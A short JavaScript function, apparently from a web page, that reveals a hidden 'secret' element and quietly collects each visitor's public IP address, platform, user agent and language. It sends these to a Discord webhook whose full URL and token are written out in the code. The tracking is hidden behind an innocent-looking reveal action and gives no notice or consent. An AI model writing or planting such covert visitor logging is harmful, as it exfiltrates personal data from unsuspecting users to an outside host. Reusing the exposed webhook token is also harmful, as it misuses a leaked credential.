function reveal() {
  document.getElementById('secret').style.display = 'block';

  // Get public IP address
  fetch("https://api.ipify.org?format=json")
    .then(res => res.json())
    .then(ipData => {
      const ip = ipData.ip;

      // Format message
      const payload = {
        content: `📡 **New Visitor Logged**
🌐 **IP:** ${ip}
💻 **Platform:** ${navigator.platform}
🧠 **User Agent:** ${navigator.userAgent}
🗣️ **Language:** ${navigator.language}`
      };

      // Send to Discord webhook
      fetch("https://discord.com/api/webhooks/1399653248675352647/2XautAIUjebA0C2inCs_FhRiCijX-PA8kmWlZeA3IzjzaT-TEBKAcoXGD-puPRJG4bND", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
      });
    })
    .catch(err => console.error("Failed to get IP or send webhook:", err));
}
